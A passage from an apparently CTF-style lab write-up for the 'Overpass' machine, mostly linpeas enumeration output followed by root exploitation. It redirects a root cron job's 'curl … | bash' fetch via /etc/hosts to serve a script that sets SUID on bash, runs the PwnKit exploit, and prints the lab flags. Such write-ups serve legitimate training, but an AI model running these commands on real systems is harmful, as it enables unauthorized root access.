X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 27  2020 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                                                                                                      
tmux 2.6                                                                                                                                                                                                                                    


/tmp/tmux-1001
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jan 15  2020 /etc/cloud/cloud.cfg                                                                                                                                                                               
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  3  2020 /usr/share/keyrings                                                                                                                                                                                




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 james james 4096 Oct 31 21:20 /home/james/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 james james 3771 Jun 27  2020 /home/james/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 james james 807 Jun 27  2020 /home/james/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount                                                                                                                                                                                     
-rwsr-xr-x 1 root root 27K Jan  8  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd                                                                                                                                                                                 
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                                                                                    
/etc/ld.so.conf                                                                                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3194 Mar 26  2018 sbin.dhclient                                                                                                                                                                                      
-rw-r--r-- 1 root root  125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root 2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                                                                     
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2020-06-27+04:34:36.9601660550 /usr/bin/overpass                                                                                                                                                                                            
2020-06-27+02:15:00.2868882860 /etc/console-setup/cached_setup_terminal.sh
2020-06-27+02:15:00.2868882860 /etc/console-setup/cached_setup_keyboard.sh
2020-06-27+02:15:00.2868882860 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in root
/swap.img                                                                                                                                                                                                                                   
/initrd.img
/vmlinuz.old
/vmlinuz
/initrd.img.old

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                                                           
total 32                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Jun 27  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Jan 15  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Jan 15  2020 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service                                                                                                                                                                         
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                                                            
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/cache/apt/pkgcache.bin                                                                                                                                                                                                                 
/var/cache/apt/srcpkgcache.bin
/var/cache/motd-news
/var/log/journal/da63cb942bf64540af49be48be5c7783/user-1000.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/system@88a5aceab11d4bd8a630f9ed8e1cb9ae-0000000000003404-0005b0156d183636.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/system.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/user-1000@73af61b33a4f429da9eab5a168d697be-000000000000391f-0005ec5b22af7f06.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/system@88a5aceab11d4bd8a630f9ed8e1cb9ae-0000000000003920-0005ec5b22ba678b.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/system@88a5aceab11d4bd8a630f9ed8e1cb9ae-000000000000388b-0005ec5b20e78aa6.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/user-1001@d54a757f72f24acc9b5ee36ec535b454-0000000000001fcf-0005a909330eb8b1.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/user-1001.journal
/var/log/journal/da63cb942bf64540af49be48be5c7783/user-1000@73af61b33a4f429da9eab5a168d697be-0000000000003403-0005b0156d146173.journal
/var/log/auth.log
/var/log/cloud-init.log
/var/log/lastlog
/var/log/wtmp
/var/log/syslog
/var/log/kern.log
/var/log/cloud-init-output.log
/home/james/.gnupg/trustdb.gpg
/home/james/.gnupg/pubring.kbx
/boot/grub/grubenv

logrotate 3.11.0

╔══════════╣ Files inside /home/james (limit 20)
total 48                                                                                                                                                                                                                                    
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Oct 31 21:20 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt

╔══════════╣ Files inside others home (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2765 Feb  3  2020 /etc/apt/sources.list.curtin.old                                                                                                                                                                   
-rw-r--r-- 1 root root 0 Jun 19  2020 /usr/src/linux-headers-4.15.0-108-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jun 19  2020 /usr/src/linux-headers-4.15.0-108-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217484 Jun 19  2020 /usr/src/linux-headers-4.15.0-108-generic/.config.old
-rw-r--r-- 1 root root 2746 Dec  5  2019 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 10939 Jun 27  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 35544 Dec  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 7905 Jun 19  2020 /lib/modules/4.15.0-108-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7857 Jun 19  2020 /lib/modules/4.15.0-108-generic/kernel/drivers/power/supply/wm831x_backup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission                                                                                                                                                                         


╔══════════╣ Web files?(output limit)
                                                                                                                                                                                                                                            
╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 1531 Jun 27  2020 /var/cache/apparmor/.features                                                                                                                                                                      
-rw-r--r-- 1 landscape landscape 0 Feb  3  2020 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb  3  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 1531 Jun 27  2020 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 20 Oct 31 21:17 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Oct 31 21:16 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 james james 220 Jun 27  2020 /home/james/.bash_logout
-rw-r--r-- 1 james james 49 Jun 27  2020 /home/james/.overpass

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 31226 Jun 27  2020 /var/backups/apt.extended_states.0                                                                                                                                                                

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/dev/shm/linpeas.sh
/etc/hosts
/home/james
/run/lock
/run/screen
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords in history files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/local/go/src/syscall/creds_test.go
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/ubuntu-advantage-tools/modules/credentials.sh
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                                                                                                                                            
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2020-02-03 18:22:20 configure base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:20 install base-passwd:amd64 <none> 3.5.44
2020-02-03 18:22:20 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 upgrade base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:25 install passwd:amd64 <none> 1:4.5-1ubuntu1
2020-02-03 18:22:25 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:25 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:26 configure base-passwd:amd64 3.5.44 <none>
2020-02-03 18:22:26 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:27 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2020-02-03 18:22:27 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status installed passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-06-27 02:15:11,712 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 25 bytes
2020-06-27 02:15:11,713 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2020-06-27 02:15:11,763 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
2020-06-27 02:15:11,764 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-06-27 02:27:45,022 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-27 02:27:45,022 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-27 04:01:22,241 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-27 04:01:22,241 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-27 04:16:03,013 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-27 04:16:03,013 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-27 04:39:18,919 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-27 04:39:18,919 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-27 05:44:17,465 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-27 05:44:17,465 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-27 15:53:05,717 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-27 15:53:05,718 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-09-24 20:55:55,109 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-09-24 20:55:55,109 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-10-31 21:17:45,917 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-10-31 21:17:45,917 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
Binary file /var/log/journal/da63cb942bf64540af49be48be5c7783/user-1001.journal matches
Jun 27 02:07:46 ubuntu-server chage[14820]: changed password expiry for sshd
Jun 27 02:07:46 ubuntu-server usermod[14815]: change user 'sshd' password
Jun 27 03:04:40 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.44) ...
Unpacking base-passwd (3.5.44) over (3.5.44) ...
Unpacking passwd (1:4.5-1ubuntu1) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════      
```

2 interesting lines here:
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

and 

```
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588
```

Let's go with the first one first.
It curls building script from overpass.thm, and pass it to bash as root. If we could impersonate overpass.thm, we could make it download our own buildscript.sh

'/etc/hosts' seems writable. Let's edit it with our own ip from:
```
ifconfig tun0             
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.18.23.136  netmask 255.255.128.0  destination 10.18.23.136
        inet6 fe80::c8b7:a49e:d4ac:87c0  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 606942  bytes 175165286 (167.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 611557  bytes 97080690 (92.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

And start a webserver, with a path to buildscript.sh.
```
python -m http.server 80
```

Created a poisoned buildscript.sh that will suid /bin/bash:
```
chmod +s /bin/bash
```

Getting a request from the server:
```
python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.209.252 - - [31/Oct/2022 17:33:53] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

Let's check /bin/bash now:
```
ls -al /bin/bash

james@overpass-prod:/dev/shm$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Bash is now SUID. Let's run it with privileges:
```
james@overpass-prod:/dev/shm$ /bin/bash -p
bash-4.4# whoami
root
```

We are now root. Let's get flag:
```
cat /root/root.txt

thm{7f336f8c359dbac18d54fdd64ea753bb}
```

Just for fun, let's try with the other privesc we found (CVE-2021-4034):
```
git clone https://github.com/berdav/CVE-2021-4034
scp -r CVE-2021-4034 james@10.10.209.252:/dev/shm
```

Login as james, then:
```
james@overpass-prod:/dev/shm$ cd CVE-2021-4034/
james@overpass-prod:/dev/shm/CVE-2021-4034$ make
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
james@overpass-prod:/dev/shm/CVE-2021-4034$ ./cve-2021-4034
# whoami
root
```

It works as well.

From [2]:
```
Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).
```

## Flag

1. User

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

2. Privesc

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```